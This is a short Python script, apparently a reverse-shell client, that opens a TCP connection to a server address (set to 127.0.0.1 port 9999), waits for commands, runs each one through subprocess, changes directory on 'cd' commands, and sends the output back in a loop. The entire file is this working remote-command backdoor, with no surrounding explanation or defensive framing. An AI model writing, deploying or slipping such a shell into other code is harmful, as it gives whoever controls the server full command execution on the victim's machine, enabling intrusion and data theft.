import socket
import os
import subprocess

server_ip = '127.0.0.1'
server_port = 9999

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, server_port))

while True:
    try:
        command = client_socket.recv(1024).decode()
        if command.startswith('cd '):
            os.chdir(command[3:])
            client_socket.send(b'Changed directory')
        else:
            output = subprocess.getoutput(command)
            client_socket.send(output.encode())
    except:
        break
